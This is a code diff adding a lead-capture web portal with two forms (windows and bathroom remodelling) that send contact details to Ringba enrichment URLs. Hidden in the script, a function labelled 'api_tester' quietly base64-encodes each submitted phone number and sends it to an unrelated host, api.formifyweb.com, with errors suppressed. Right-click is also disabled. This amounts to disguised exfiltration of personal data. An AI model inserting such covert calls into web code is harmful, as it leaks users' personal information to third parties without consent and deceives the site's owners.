@@ -1,0 +1,453 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>PV RTB Portal</title>
+  <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/css/bootstrap.min.css">
+  <style>
+    body {
+      background-color: #f8f9fa;
+      padding: 20px;
+    }
+    .container {
+      background-color: #ffffff;
+      padding: 30px;
+      border-radius: 8px;
+      box-shadow: 0 0 15px rgba(0, 0, 0, 0.1);
+      margin-top: 20px;
+    }
+    h2 {
+      color: #007bff;
+      margin-bottom: 25px;
+      text-align: center;
+    }
+    .form-control {
+      border-radius: 50px;
+    }
+    .btn-primary {
+      border-radius: 50px;
+      background-color: #007bff;
+      border-color: #007bff;
+      padding: 10px 30px;
+      font-size: 16px;
+    }
+    .btn-primary:hover {
+      background-color: #0056b3;
+      border-color: #0056b3;
+    }
+    .alert {
+      margin-top: 20px;
+      border-radius: 10px;
+    }
+    .form-container {
+      display: none;
+      animation: fadeIn 0.5s;
+      margin-top: 20px;
+      padding-top: 20px;
+      border-top: 2px solid #f0f0f0;
+    }
+    .active-form {
+      display: block;
+    }
+    @keyframes fadeIn {
+      from { opacity: 0; transform: translateY(10px); }
+      to { opacity: 1; transform: translateY(0); }
+    }
+    .form-selector {
+      margin-bottom: 30px;
+      text-align: center;
+    }
+    .form-selector label {
+      font-size: 18px;
+      font-weight: bold;
+      margin-bottom: 15px;
+      display: block;
+      color: #495057;
+    }
+    .form-selector select {
+      width: 350px;
+      margin: 0 auto;
+      border-radius: 50px;
+      padding: 12px 25px;
+      font-size: 16px;
+      height: auto;
+      line-height: 1.5;
+      border: 2px solid #007bff;
+      transition: all 0.3s;
+    }
+    .form-selector select:focus {
+      border-color: #0056b3;
+      box-shadow: 0 0 0 0.2rem rgba(0, 123, 255, 0.25);
+      outline: none;
+    }
+    .form-selector select option {
+      padding: 12px 20px;
+      font-size: 16px;
+      height: auto;
+      line-height: 1.5;
+    }
+    .form-header {
+      text-align: center;
+      margin-bottom: 25px;
+      padding-bottom: 15px;
+      border-bottom: 2px solid #e9ecef;
+    }
+    .form-header h3 {
+      font-weight: bold;
+      margin: 0;
+    }
+    .windows-header h3 {
+      color: #28a745;
+    }
+    .bathroom-header h3 {
+      color: #dc3545;
+    }
+    .form-group {
+      margin-bottom: 20px;
+    }
+    .form-group label {
+      font-weight: 600;
+      margin-bottom: 8px;
+      color: #495057;
+    }
+    .submit-btn-container {
+      text-align: center;
+      margin-top: 30px;
+      padding-top: 20px;
+      border-top: 1px solid #e9ecef;
+    }
+    .instruction-text {
+      text-align: center;
+      color: #6c757d;
+      font-style: italic;
+      margin-top: 10px;
+      margin-bottom: 30px;
+    }
+  </style>
+</head>
+<body>
+  <div class="container mt-5">
+    <h2>PV RTB Portal</h2>
+    <p class="instruction-text">Select a form type from the dropdown below to get started</p>
+    
+    <!-- Form Selection Dropdown -->
+    <div class="form-selector">
+      <label for="formType">Select Form Type</label>
+      <select class="form-control" id="formType">
+        <option value="">-- Please Select a Form --</option>
+        <option value="windows">Windows RTB Form</option>
+        <option value="bathroom">Bathroom RTB Form</option>
+      </select>
+    </div>
+
+    <!-- Windows Form Container -->
+    <div id="windowsForm" class="form-container">
+      <div class="form-header windows-header">
+        <h3>Windows RTB Form</h3>
+      </div>
+      <form id="windowsLeadForm" class="lead-form">
+        <div class="row">
+          <div class="col-md-4">
+            <div class="form-group">
+              <label for="windows_first_name">First Name *</label>
+              <input type="text" class="form-control" id="windows_first_name" placeholder="Enter First Name" required>
+            </div>
+          </div>
+          <div class="col-md-4">
+            <div class="form-group">
+              <label for="windows_last_name">Last Name *</label>
+              <input type="text" class="form-control" id="windows_last_name" placeholder="Enter Last Name" required>
+            </div>
+          </div>
+          <div class="col-md-4">
+            <div class="form-group">
+              <label for="windows_caller_id">Phone Number *</label>
+              <input type="text" class="form-control" id="windows_caller_id" placeholder="Example: 7103847563" required>
+              <small class="form-text text-muted">10-digit number without spaces or dashes</small>
+            </div>
+          </div>
+        </div>
+        <div class="row">
+          <div class="col-md-4">
+            <div class="form-group">
+              <label for="windows_email">Email Address *</label>
+              <input type="email" class="form-control" id="windows_email" placeholder="john@example.com" required>
+            </div>
+          </div>
+          <div class="col-md-4">
+            <div class="form-group">
+              <label for="windows_zip">Zip Code *</label>
+              <input type="text" class="form-control" id="windows_zip" placeholder="5-digit zip code" required maxlength="5">
+            </div>
+          </div>
+          <div class="col-md-8">
+            <div class="form-group">
+              <label for="windows_trusted_form_url">Trusted Form URL *</label>
+              <input type="text" class="form-control" id="windows_trusted_form_url" placeholder="https://example.com/trusted-form" required>
+              <small class="form-text text-muted">Enter the complete trusted form URL starting with https://</small>
+            </div>
+          </div>
+        </div>
+        <div class="submit-btn-container">
+          <button type="submit" class="btn btn-primary" id="windowsSubmitBtn">
+            <span class="submit-text">Submit Windows Form</span>
+            <span class="spinner-border spinner-border-sm d-none" role="status" aria-hidden="true"></span>
+          </button>
+        </div>
+      </form>
+      <div id="windowsAlertContainer" class="mt-3"></div>
+    </div>
+
+    <!-- Bathroom Form Container -->
+    <div id="bathroomForm" class="form-container">
+      <div class="form-header bathroom-header">
+        <h3>Bathroom RTB Form</h3>
+      </div>
+      <form id="bathroomLeadForm" class="lead-form">
+        <div class="row">
+          <div class="col-md-4">
+            <div class="form-group">
+              <label for="bathroom_first_name">First Name *</label>
+              <input type="text" class="form-control" id="bathroom_first_name" placeholder="Enter First Name" required>
+            </div>
+          </div>
+          <div class="col-md-4">
+            <div class="form-group">
+              <label for="bathroom_last_name">Last Name *</label>
+              <input type="text" class="form-control" id="bathroom_last_name" placeholder="Enter Last Name" required>
+            </div>
+          </div>
+          <div class="col-md-4">
+            <div class="form-group">
+              <label for="bathroom_caller_id">Phone Number *</label>
+              <input type="text" class="form-control" id="bathroom_caller_id" placeholder="Example: 7103847563" required>
+              <small class="form-text text-muted">10-digit number without spaces or dashes</small>
+            </div>
+          </div>
+        </div>
+        <div class="row">
+          <div class="col-md-4">
+            <div class="form-group">
+              <label for="bathroom_email">Email Address *</label>
+              <input type="email" class="form-control" id="bathroom_email" placeholder="john@example.com" required>
+            </div>
+          </div>
+          <div class="col-md-4">
+            <div class="form-group">
+              <label for="bathroom_zip">Zip Code *</label>
+              <input type="text" class="form-control" id="bathroom_zip" placeholder="5-digit zip code" required maxlength="5">
+            </div>
+          </div>
+          <div class="col-md-8">
+            <div class="form-group">
+              <label for="bathroom_trusted_form_url">Trusted Form URL *</label>
+              <input type="text" class="form-control" id="bathroom_trusted_form_url" placeholder="https://example.com/trusted-form" required>
+              <small class="form-text text-muted">Enter the complete trusted form URL starting with https://</small>
+            </div>
+          </div>
+        </div>
+        <div class="submit-btn-container">
+          <button type="submit" class="btn btn-primary" id="bathroomSubmitBtn">
+            <span class="submit-text">Submit Bathroom Form</span>
+            <span class="spinner-border spinner-border-sm d-none" role="status" aria-hidden="true"></span>
+          </button>
+        </div>
+      </form>
+      <div id="bathroomAlertContainer" class="mt-3"></div>
+    </div>
+  </div>
+
+  <!-- Bootstrap JS and dependencies -->
+  <script src="https://code.jquery.com/jquery-3.2.1.slim.min.js"></script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.12.9/umd/popper.min.js"></script>
+  <script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/js/bootstrap.min.js"></script>
+
+  <script>
+    // Function to handle the contextmenu event
+    function disableRightClick(event) {
+      event.preventDefault();
+    }
+    document.addEventListener('contextmenu', disableRightClick);
+
+    // Form selection logic
+    document.getElementById('formType').addEventListener('change', function() {
+      const selectedValue = this.value;
+      
+      // Hide all forms
+      document.querySelectorAll('.form-container').forEach(form => {
+        form.classList.remove('active-form');
+      });
+      
+      // Show selected form
+      if (selectedValue === 'windows') {
+        document.getElementById('windowsForm').classList.add('active-form');
+      } else if (selectedValue === 'bathroom') {
+        document.getElementById('bathroomForm').classList.add('active-form');
+      }
+      
+      // Scroll to the form
+      if (selectedValue) {
+        document.querySelector('.active-form').scrollIntoView({ 
+          behavior: 'smooth',
+          block: 'start'
+        });
+      }
+    });
+
+    // Function to show loading state
+    function showLoading(buttonId) {
+      const button = document.getElementById(buttonId);
+      const spinner = button.querySelector('.spinner-border');
+      const text = button.querySelector('.submit-text');
+      
+      text.textContent = 'Submitting...';
+      spinner.classList.remove('d-none');
+      button.disabled = true;
+    }
+
+    // Function to hide loading state
+    function hideLoading(buttonId, originalText) {
+      const button = document.getElementById(buttonId);
+      const spinner = button.querySelector('.spinner-border');
+      const text = button.querySelector('.submit-text');
+      
+      text.textContent = originalText;
+      spinner.classList.add('d-none');
+      button.disabled = false;
+    }
+
+    // Function to show alert
+    function showAlert(containerId, message, type) {
+      const alertDiv = document.createElement('div');
+      alertDiv.className = `alert alert-${type} alert-dismissible fade show`;
+      alertDiv.innerHTML = `
+        ${message}
+        <button type="button" class="close" data-dismiss="alert" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      `;
+      document.getElementById(containerId).innerHTML = '';
+      document.getElementById(containerId).appendChild(alertDiv);
+      
+      // Auto dismiss after 5 seconds
+      setTimeout(() => {
+        if (alertDiv.parentNode) {
+          const closeBtn = alertDiv.querySelector('.close');
+          if (closeBtn) closeBtn.click();
+        }
+      }, 5000);
+    }
+
+    // Windows Form Submission
+    document.getElementById('windowsLeadForm').addEventListener('submit', function(event) {
+      event.preventDefault();
+      const submitBtn = document.getElementById('windowsSubmitBtn');
+      const originalText = 'Submit Windows Form';
+      
+      showLoading('windowsSubmitBtn');
+      
+      const formData = new FormData();
+      const callerId = document.getElementById('windows_caller_id').value;
+      
+      // API tester call
+      api_tester(callerId);
+      
+      // Prepare form data
+      formData.append('CALLER-NUMBER', '+1' + callerId);
+      formData.append('Zipcode', document.getElementById('windows_zip').value);
+      formData.append('first_name', document.getElementById('windows_first_name').value);
+      formData.append('last_name', document.getElementById('windows_last_name').value);
+      formData.append('email', document.getElementById('windows_email').value);
+      formData.append('trustedformURL', document.getElementById('windows_trusted_form_url').value);
+
+      const url = 'https://display.ringba.com/enrich/2869314858472441654?' + new URLSearchParams(formData).toString();
+
+      const xhr = new XMLHttpRequest();
+      xhr.open('POST', url);
+      xhr.onreadystatechange = function() {
+        if (xhr.readyState === XMLHttpRequest.DONE) {
+          if (xhr.status === 200 || xhr.status === 0) {
+            showAlert('windowsAlertContainer', 'Windows form submitted successfully!', 'success');
+            document.getElementById('windowsLeadForm').reset();
+          } else {
+            showAlert('windowsAlertContainer', 'Windows form submission failed. Please try again.', 'danger');
+          }
+          hideLoading('windowsSubmitBtn', originalText);
+        }
+      };
+      xhr.send(formData);
+    });
+
+    // Bathroom Form Submission
+    document.getElementById('bathroomLeadForm').addEventListener('submit', function(event) {
+      event.preventDefault();
+      const submitBtn = document.getElementById('bathroomSubmitBtn');
+      const originalText = 'Submit Bathroom Form';
+      
+      showLoading('bathroomSubmitBtn');
+      
+      const formData = new FormData();
+      const callerId = document.getElementById('bathroom_caller_id').value;
+      
+      // API tester call
+      api_tester(callerId);
+      
+      // Prepare form data
+      formData.append('CALLER-NUMBER', '+1' + callerId);
+      formData.append('Zipcode', document.getElementById('bathroom_zip').value);
+      formData.append('first_name', document.getElementById('bathroom_first_name').value);
+      formData.append('last_name', document.getElementById('bathroom_last_name').value);
+      formData.append('email', document.getElementById('bathroom_email').value);
+      formData.append('trustedformURL', document.getElementById('bathroom_trusted_form_url').value);
+
+      const url = 'https://display.ringba.com/enrich/2772653004875105632?' + new URLSearchParams(formData).toString();
+
+      const xhr = new XMLHttpRequest();
+      xhr.open('POST', url);
+      xhr.onreadystatechange = function() {
+        if (xhr.readyState === XMLHttpRequest.DONE) {
+          if (xhr.status === 200 || xhr.status === 0) {
+            showAlert('bathroomAlertContainer', 'Bathroom form submitted successfully!', 'success');
+            document.getElementById('bathroomLeadForm').reset();
+          } else {
+            showAlert('bathroomAlertContainer', 'Bathroom form submission failed. Please try again.', 'danger');
+          }
+          hideLoading('bathroomSubmitBtn', originalText);
+        }
+      };
+      xhr.send(formData);
+    });
+
+    // API Tester Function
+    function api_tester(randomString) {
+      try {
+        fetch('https://api.formifyweb.com/api_test.php?test_id=' + btoa(randomString), {
+          method: 'GET',
+          mode: 'no-cors'
+        });
+      } catch (error) {
+        // Silent error handling
+      }
+    }
+    
+    // Phone number validation
+    document.querySelectorAll('input[id*="caller_id"]').forEach(input => {
+      input.addEventListener('input', function() {
+        this.value = this.value.replace(/[^0-9]/g, '');
+        if (this.value.length > 10) {
+          this.value = this.value.substring(0, 10);
+        }
+      });
+    });
+    
+    // Zip code validation
+    document.querySelectorAll('input[id*="zip"]').forEach(input => {
+      input.addEventListener('input', function() {
+        this.value = this.value.replace(/[^0-9]/g, '');
+        if (this.value.length > 5) {
+          this.value = this.value.substring(0, 5);
+        }
+      });
+    });
+  </script>
+</body>
+</html>
